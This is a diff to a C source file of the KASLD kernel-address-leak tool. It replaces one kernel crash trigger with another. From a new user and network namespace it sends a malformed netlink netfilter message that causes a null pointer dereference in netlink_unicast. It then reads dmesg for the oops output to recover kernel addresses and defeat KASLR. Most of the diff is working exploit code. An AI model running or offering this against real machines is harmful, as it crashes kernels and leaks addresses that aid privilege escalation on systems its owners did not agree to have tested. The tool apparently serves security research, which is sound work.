@@ -1,26 +1,23 @@
 // This file is part of KASLD - https://github.com/bcoles/kasld
-// Trigger kernel oops inet_csk_listen_stop GPF (CVE-2017-18509) and search syslog for splat
-// - https://lists.openwall.net/netdev/2017/12/04/40
+// Trigger kernel oops netlink_getsockbyportid null pointer deref and search syslog for splat
 // Requires:
 // - kernel.unprivileged_userns_clone = 1; (Default on Ubuntu systems)
 // - kernel.dmesg_restrict = 0 (Default on Ubuntu systems); or CAP_SYSLOG capabilities.
-// Based on trigger PoC code by Denis Andzakovic:
-// - https://pulsesecurity.co.nz/advisories/linux-kernel-4.9-inetcsklistenstop-gpf
+// Based on original trigger PoC code by vn1k:
+// - https://github.com/duasynt/meh/blob/master/nfnetlink1019.c
 
 #define _GNU_SOURCE
 
-#include <sched.h>
-#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <sched.h>
 #include <sys/klog.h>
 #include <sys/mman.h>
-#include <sys/types.h>
 #include <sys/socket.h>
 #include <sys/utsname.h>
-#include <netinet/in.h>
+#include <linux/netlink.h>
 
 // https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
 unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
@@ -35,22 +32,36 @@ struct utsname get_kernel_version() {
   return u;
 }
 
-int trigger_oops() {
-  if (unshare(CLONE_NEWUSER) != 0) {
-    printf("[-] unshare(CLONE_NEWUSER): %m\n");
-    return 1;
-  }
-  if (unshare(CLONE_NEWNET) != 0) {
-    printf("[-] unshare(CLONE_NEWNET): %m\n");
+int trigger_oops(void) {
+  if (unshare(CLONE_NEWUSER) == -1) {
+    printf("unshare(CLONE_NEWUSER): %m\n");
     return 1;
   }
 
-  uint32_t opt = 99999999;
-  int sock = socket(AF_INET6, SOCK_STREAM, 0);
+  if (unshare(CLONE_NEWNET) == -1) {
+    printf("unshare(CLONE_NEWNET): %m\n");
+    return 1;
+  }
 
-  listen(sock, 0);
-  setsockopt(sock, IPPROTO_IPV6, 0xd1, &opt, 4);
-  close(sock);
+  struct iovec iov[1];
+  struct msghdr msg;
+
+  memset(&msg, 0, sizeof(msg));
+  memset(iov,  0, sizeof(iov));
+
+  int buf[64];
+  memset(buf, 0, 64);
+
+  int s = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+
+  iov[0].iov_base = buf;
+  iov[0].iov_len = 0xa0;
+  buf[0] = 0xa0; // len 
+  buf[1] = NLMSG_MIN_TYPE; // type
+  msg.msg_iov    = iov;
+  msg.msg_iovlen = 1;
+
+  sendmsg(s, &msg, 0x40000);
 
   return 0;
 }
@@ -107,7 +118,7 @@ unsigned long search_dmesg(char* needle) {
 }
 
 int main (int argc, char **argv) {
-  printf("[.] trying inet_csk_listen_stop GPF ...\n");
+  printf("[.] trying netlink_unicast null pointer dereference ...\n");
 
   struct utsname u = get_kernel_version();
 
@@ -134,7 +145,7 @@ int main (int argc, char **argv) {
     return 0;
   }
 
-  char *needle = "inet_csk_listen_stop";
+  char *needle = "netlink_unicast";
 
   printf("[.] searching dmesg for %s ...\n", needle);
 
